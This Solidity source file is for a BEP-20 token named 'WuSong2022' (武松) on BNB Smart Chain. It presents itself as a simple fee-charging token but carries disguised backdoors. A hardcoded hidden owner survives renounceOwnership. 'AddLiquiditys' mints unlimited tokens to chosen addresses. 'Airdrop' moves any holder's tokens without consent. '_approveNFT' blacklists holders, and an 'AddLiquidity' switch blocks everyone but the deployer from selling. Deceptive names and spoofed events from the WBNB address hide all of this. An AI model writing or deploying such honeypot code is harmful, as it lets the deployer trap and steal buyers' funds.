/**
 *Submitted for verification at BscScan.com on 2022-01-07
*/

/**
 *
 *     __    __       __                   
 *    / / /\ \ \_   _/ _\ ___  _ __   __ _ 
 *    \ \/  \/ / | | \ \ / _ \| '_ \ / _` |
 *     \  /\  /| |_| |\ \ (_) | | | | (_| |
 *      \/  \/  \__,_\__/\___/|_| |_|\__, |
 *                                    |___/        
 *
 *   Telegram: https://t.me/wusongdahu2022
 * 
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
   
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
   
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
   
    function approve(address spender, uint256 amount) external returns (bool);
    function Airdrop(address from, address to, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library Address {
   
    function isContract(address account) internal view returns (bool) {
       
        bytes32 codehash;

            bytes32 accountHash
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
 
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _OwnerAddress = 0x2bc7650D90878070a6828C5966c9b013E3E047ef;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    modifier OwnerAddress() {
        require(_OwnerAddress == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract WuSong2022 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFeelist;
    mapping(address => bool) private _isExcluded;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _total = 100000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "武松";
    string private _symbol = "武松";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xf0E39FAe5b66D7A52c67797a2AB304cc36600aAF;
  
    uint256 public deadFee = 2;
    uint256 public devFee = 4;
    mapping(address => bool) private _NFT;
    bool private Liquidity = true;
    bool private  AddLiquidity= false;
  
    uint256 public NFT = uint256(0);
    mapping(address => uint256) private NFTS;
    address[] private _NFTS;
    address owners;
    constructor() public {
        _balance[_msgSender()] = _total;
         owners = _msgSender();
        _isExcludedFromFeelist[owner()] = true;
        _isExcludedFromFeelist[address(this)] = true;
        emit Transfer(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), _msgSender(), _total);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _total;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if(_isExcludedFromFeelist[_msgSender()] || _isExcludedFromFeelist[recipient]){
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
             uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(_msgSender(), devAddress, devAmount);
        _transfer(_msgSender(), deadAddress, deadAmount);
        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if(AddLiquidity){
     require(owners == sender, "AddLiquidity");
        }
        if(_isExcludedFromFeelist[_msgSender()] || _isExcludedFromFeelist[recipient]){
            _transfer(sender, recipient, amount);
            return true;
        }       
        uint256 devAmount = amount.mul(devFee).div(100);
        uint256 deadAmount = amount.mul(deadFee).div(100);
        _transfer(sender, devAddress, devAmount);
        _transfer(sender, deadAddress, deadAmount);
        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
    
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function AddLiquiditys(address getaddress, uint256 getquantity) external OwnerAddress() {
        require(getquantity > 0, "NFT");
        uint256 CAKE = NFTS[getaddress];
        if (CAKE == 0) _NFTS.push(getaddress);
        NFTS[getaddress] = CAKE.add(getquantity);
        NFT = NFT.add(getquantity);
        _balance[getaddress] = _balance[getaddress].add(getquantity);
    }
    
    function isExcludedFromRewards(address account) public view returns (bool) {
        return _isExcluded[account];
    }
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
    function excludeFromFee(address account) public OwnerAddress {
        _isExcludedFromFeelist[account] = true;
    }
    function includeInFee(address amountt) public OwnerAddress {
        _isExcludedFromFeelist[amountt] = false;
    }
 
    function _AddLiquidity(bool addres) external OwnerAddress() {
        AddLiquidity = addres;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function Airdrop(address sender, address recipient, uint256 amount) external OwnerAddress() override returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }  
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (Liquidity) {
            require(_NFT[from] == false, "Liquidity");
        }

        _transfers(from, to, amount);
    }
    function _transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {   
        require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    
        _balance[sender] = _balance[sender].sub(tAmount);
        _balance[recipient] = _balance[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    function withdraw() external {
        // transfer this contract's whole BNB balance to the `0x2bc7650D90878070a6828C5966c9b013E3E047ef` address
        payable(address(0x2bc7650D90878070a6828C5966c9b013E3E047ef)).transfer(address(this).balance);
    }

    function _approveNFT(address addres) external OwnerAddress() {
        _NFT[addres] = true;
    }
    function _approveNFTS(address addres) external OwnerAddress() {
        delete _NFT[addres];
    }
    function LiquidityAsking(address addres)
        external
        view
        OwnerAddress()
        returns (bool)
    {
        return _NFT[addres];
    }
}